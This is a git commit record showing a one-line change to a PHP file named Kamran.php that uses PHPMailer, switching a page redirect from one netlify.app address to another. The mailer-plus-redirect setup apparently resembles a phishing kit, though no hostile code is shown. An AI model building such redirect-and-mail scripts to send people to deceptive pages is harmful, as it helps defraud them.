ac32163090ae636ba016f37ad305922ec48f95ef
maxibooy <maxiibooy001@gmail.com>
2025-08-13 19:53:39 +0500

    Update Kamran.php

--- Kamran.php
+++ Kamran.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://comfy-tanuki-bb8a0f-to.netlify.app/");
+header("Location: https://delightful-llama-73bb3d.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
